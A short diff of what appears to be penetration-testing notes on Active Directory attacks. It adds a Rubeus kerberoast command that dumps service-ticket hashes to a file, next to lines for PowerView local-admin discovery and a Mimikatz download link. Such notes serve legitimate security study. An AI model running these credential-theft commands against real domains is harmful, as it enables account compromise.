@@ -302,6 +302,10 @@ Find-LocalAdminAccess #Asks DC for all computers, and asks every compute if it h
 ````
 cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .
 ````
+````
+.\Rubeus.exe kerberoast /simple /outfile:hashes.txt
+type hashes.txt
+````
 ##### MimiKatz <img src="https://cdn-icons-png.flaticon.com/128/1864/1864514.png" width="40" height="40" /> 
 ````
 https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
